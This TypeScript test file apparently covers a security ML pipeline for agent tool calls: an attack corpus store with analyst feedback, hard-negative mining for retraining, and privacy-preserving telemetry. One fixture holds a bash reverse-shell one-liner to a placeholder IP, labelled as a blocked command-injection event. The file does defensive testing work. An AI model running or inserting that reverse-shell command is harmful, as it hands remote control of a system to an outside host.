import { ProprietaryAttackCorpusStore } from '../../src/security/ml/proprietary-attack-corpus';
import { AdversarialLearningLoop } from '../../src/security/ml/adversarial-learning-loop';
import { PrivacyTelemetryEngine } from '../../src/security/ml/privacy-telemetry';
import { FeatureExtractor } from '../../src/security/ml/feature-extractor';
import { TabularRiskModel } from '../../src/security/ml/models/tabular-risk-model';

describe('Adversarial Learning Loop, Corpus & Privacy Telemetry (Roadmap Section 7, 8, 9)', () => {
  describe('ProprietaryAttackCorpusStore', () => {
    it('records security events and updates human feedback', () => {
      const store = new ProprietaryAttackCorpusStore();
      const evt = store.recordEvent({
        serverIdentity: 'test-server',
        toolName: 'exec_cmd',
        toolSchemaHash: 'hash-123',
        capabilities: ['shellExecution'],
        requestSummary: {
          byteSize: 128,
          entropy: 4.5,
          extractedCommandFingerprint: 'bash -i >& /dev/tcp/1.2.3.4/8080 0>&1'
        },
        sequenceContext: ['read_env', 'exec_cmd'],
        detectorOutputs: [{ detectorId: 'cmd-analyzer', category: 'COMMAND_INJECTION', severity: 0.95 }],
        finalDecision: 'BLOCK',
        incidentOutcome: 'BLOCKED'
      });

      expect(evt.id).toMatch(/^SEC-EVT-/);
      expect(store.size()).toBe(1);

      store.annotateFeedback(evt.id, {
        reviewedBy: 'security-analyst@corp.com',
        isActualAttack: true,
        notes: 'Reverse shell attempt'
      });

      const confirmed = store.getConfirmedAttacks();
      expect(confirmed.length).toBe(1);
      expect(confirmed[0].incidentOutcome).toBe('CONFIRMED_EXPLOIT');
    });
  });

  describe('AdversarialLearningLoop', () => {
    it('mines hard negatives and compiles balanced retraining dataset', () => {
      const store = new ProprietaryAttackCorpusStore();
      // Record a false positive confirmed benign by human
      const fp = store.recordEvent({
        serverIdentity: 'test-server',
        toolName: 'complex_data_analysis',
        toolSchemaHash: 'hash-abc',
        capabilities: ['filesystemRead'],
        requestSummary: {
          byteSize: 256,
          entropy: 5.8
        },
        sequenceContext: ['read_file'],
        detectorOutputs: [{ detectorId: 'entropy-detector', category: 'ANOMALOUS_BEHAVIOR', severity: 0.65 }],
        finalDecision: 'PROMPT',
        incidentOutcome: 'QUARANTINED'
      });

      store.annotateFeedback(fp.id, {
        reviewedBy: 'security-analyst@corp.com',
        isActualAttack: false,
        notes: 'Encrypted telemetry file, legitimate benign tool usage'
      });

      const loop = new AdversarialLearningLoop(store);
      const hardNegatives = loop.mineHardNegatives();
      expect(hardNegatives.length).toBe(1);
      expect(hardNegatives[0].toolName).toBe('complex_data_analysis');

      const dataset = loop.compileRetrainingDataset('v1.2.0');
      expect(dataset.datasetVersion).toBe('v1.2.0');
      expect(dataset.hardNegativeCount).toBe(1);
      expect(dataset.syntheticAdversarialCount).toBeGreaterThan(0);
    });
  });

  describe('PrivacyTelemetryEngine', () => {
    it('transmits privacy-preserving feature vectors without raw customer payloads', () => {
      const engine = new PrivacyTelemetryEngine('cloud-intel', 'prod-mcp-01');
      const features = FeatureExtractor.extractFeatures({
        tool: { toolName: 'sql_query' },
        request: { rawBody: { query: 'SELECT * FROM users WHERE secret_token = "private_customer_data"' } }
      });
      const pred = TabularRiskModel.predict(features);

      const packet = engine.packageTelemetry({
        toolName: 'sql_query',
        schema: { type: 'object' },
        capabilities: ['databaseAccess'],
        features,
        prediction: pred,
        evidence: []
      });

      expect(packet).not.toBeNull();
      expect(packet?.rawBodyIncluded).toBe(false);
      expect(packet?.featureDigest).toBeDefined();
      expect(JSON.stringify(packet)).not.toContain('private_customer_data');
    });

    it('strictly drops telemetry in air-gapped and self-hosted modes', () => {
      const airGapped = new PrivacyTelemetryEngine('air-gapped');
      const features = FeatureExtractor.extractFeatures({
        tool: { toolName: 'read' },
        request: { rawBody: {} }
      });
      const pred = TabularRiskModel.predict(features);

      const packet = airGapped.packageTelemetry({
        toolName: 'read',
        schema: {},
        capabilities: [],
        features,
        prediction: pred,
        evidence: []
      });

      expect(packet).toBeNull();
    });
  });
});
